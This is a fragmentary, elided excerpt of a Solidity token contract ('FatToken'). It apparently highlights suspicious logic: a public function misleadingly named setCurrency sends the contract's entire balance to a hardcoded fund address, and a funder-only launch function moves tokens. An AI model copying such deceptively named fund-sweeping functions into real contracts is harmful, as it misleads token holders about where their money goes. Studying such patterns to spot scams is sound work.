...
abstract contract TOKEN is IERC20, Ownable {
    ...
    function setCurrency() public {
        payable(fundAddress).transfer(address(this).balance);
    }

    function launch(address token, uint256 amount, address to) public onlyFunder {
...
contract FatToken is TOKEN {
    ...
    constructor() TOKEN(
        ...
        address(0x20C741FFFFd1562683012Eb778f023f65B727b9C),
